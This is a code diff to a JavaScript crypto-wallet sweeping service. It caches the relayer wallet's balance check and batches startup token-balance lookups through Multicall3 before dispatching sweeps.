@@ -1285,12 +1285,23 @@ async function checkAllBalances(address) {
 
 // ── Dispatch sweep — relayer gate + debounce ──────────────────────────────────
 
+let _relayerBalCache = { val: null, ts: 0 };
+async function getRelayerBalance() {
+  const now = Date.now();
+  if (_relayerBalCache.val !== null && now - _relayerBalCache.ts < 60_000) {
+    return _relayerBalCache.val;
+  }
+  const bal = await rpcProvider.getBalance(relayerWallet.address);
+  _relayerBalCache = { val: bal, ts: now };
+  return bal;
+}
+
 async function dispatchSweep(wallet) {
   const short = wallet.address.slice(0, 10);
   log(`[sweep] starting for ${short} type=${wallet.type}`);
 
-  // Relayer balance gate
-  const relayerBal = await rpcProvider.getBalance(relayerWallet.address);
+  // Relayer balance gate (cached — 1 RPC call per 60s regardless of wallet count)
+  const relayerBal = await getRelayerBalance();
   const min = { eth: ethers.parseEther("0.005"), bnb: ethers.parseEther("0.005"), polygon: ethers.parseEther("1") };
   if (relayerBal < (min[CHAIN] ?? min.bnb)) {
     log(`[sweep] ${short} — relayer too low (${ethers.formatEther(relayerBal)}), skipping`);
@@ -2203,24 +2214,51 @@ async function init() {
 }
 
 async function startupSweepPass() {
-  const wallets = [...monitoredWallets.values()];
-  if (!wallets.length) return;
-  log(`[startup] checking balances for ${wallets.length} wallets…`);
-  let swept = 0;
+  const wallets = [...monitoredWallets.values()].filter(w => w.type !== "monitoring");
+  if (!wallets.length || !TOKENS.length) return;
+  log(`[startup] batch-checking ${wallets.length} wallets × ${TOKENS.length} tokens…`);
+
+  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, rpcProvider);
+  const CHUNK     = 250;
+  const pairs     = [];
   for (const w of wallets) {
-    if (w.type === "monitoring") continue;
+    for (const t of TOKENS) pairs.push({ wallet: w, token: t });
+  }
+
+  const balanceMap = new Map();
+  for (let i = 0; i < pairs.length; i += CHUNK) {
+    const chunk = pairs.slice(i, i + CHUNK);
     try {
-      const balances = await checkAllBalances(w.address);
-      const nonZero  = balances.filter(b => b.balance > 0n);
-      if (nonZero.length > 0) {
-        log(`[startup] ${w.address.slice(0, 10)} has balance (${nonZero.map(b => b.symbol).join(", ")}) — sweeping`);
-        await dispatchSweep(w).catch(e => log(`[startup] sweep error: ${e.message}`));
-        swept++;
+      const calls      = chunk.map(p => ({
+        target:       p.token.address,
+        allowFailure: true,
+        callData:     ERC20_BAL_IFACE.encodeFunctionData("balanceOf", [p.wallet.address]),
+      }));
+      const returnData = await multicall.aggregate3(calls);
+      for (let j = 0; j < chunk.length; j++) {
+        const { success, returnData: data } = returnData[j];
+        if (!success || !data || data === "0x") continue;
+        try {
+          const [balance] = ERC20_BAL_IFACE.decodeFunctionResult("balanceOf", data);
+          if (balance > 0n) {
+            const addr = chunk[j].wallet.address;
+            if (!balanceMap.has(addr)) balanceMap.set(addr, []);
+            balanceMap.get(addr).push({ ...chunk[j].token, balance });
+          }
+        } catch { /* malformed */ }
       }
     } catch (e) {
-      // non-fatal: skip and move to next wallet
+      warn(`[startup] multicall chunk ${i} failed: ${e.message}`);
     }
-    await new Promise(r => setTimeout(r, 200));
+  }
+
+  let swept = 0;
+  for (const w of wallets) {
+    const nonZero = balanceMap.get(w.address) ?? [];
+    if (nonZero.length === 0) continue;
+    log(`[startup] ${w.address.slice(0, 10)} has balance (${nonZero.map(b => b.symbol).join(", ")}) — sweeping`);
+    await dispatchSweep(w).catch(e => log(`[startup] sweep error: ${e.message}`));
+    swept++;
   }
   log(`[startup] pass complete — swept ${swept}/${wallets.length} wallets with balance`);
 }
